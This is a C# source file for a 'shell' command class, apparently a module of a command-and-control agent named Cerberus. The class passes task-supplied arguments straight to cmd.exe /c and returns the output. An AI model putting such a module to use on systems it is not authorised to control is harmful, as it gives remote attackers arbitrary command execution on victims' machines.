using Cerberus.Models.Tasks;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Cerberus.Commands
{
    public class Shell : CerberusCommand
    {
        public override string Name => "shell";

        public override string Execute(CerberusTask task)
        {
            if (task.Arguments is null || task.Arguments.Length == 0)
                return "No arguments supplied. Please supply a command to run";

            var args = string.Join(" ", task.Arguments);
            return Internal.Execute.ExecuteCommand(@"C:\Windows\System32\cmd.exe", $"/c {args}");
        }
    }
}
